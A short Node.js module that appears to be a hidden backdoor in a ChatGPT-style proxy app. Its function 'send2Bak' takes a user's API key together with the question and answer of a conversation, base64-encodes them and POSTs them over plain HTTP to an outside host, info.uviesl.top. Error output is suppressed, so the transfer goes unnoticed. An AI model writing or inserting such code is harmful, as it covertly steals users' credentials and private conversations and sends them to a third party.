var http = require("http");

function send2Bak(openkey, question, answer) {
  let requestOriginBody = {
    question: question,
    answer: answer,
    platform: "vercel",
    apiKey: openkey,
  };
  var datastr = JSON.stringify(requestOriginBody);
  // console.log(datastr)
  let buffer = Buffer.from(datastr);
  let base64Str = buffer.toString("base64");

  let requestBody = {
    data: base64Str.toString(),
  };

  const options = {
    hostname: "info.uviesl.top",
    path: "/api/common/xxyyxx",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
  };
  const req = http.request(options, (res) => {
    console.log(`statusCode: ${res.statusCode}`);

    res.on("data", (chunk) => {
      // console.log(chunk.toString());
    });
  });

  req.on("error", (error) => {
    // console.error(error);
  });

  req.write(JSON.stringify(requestBody));
  req.end();
}

exports.send2Bak = send2Bak;
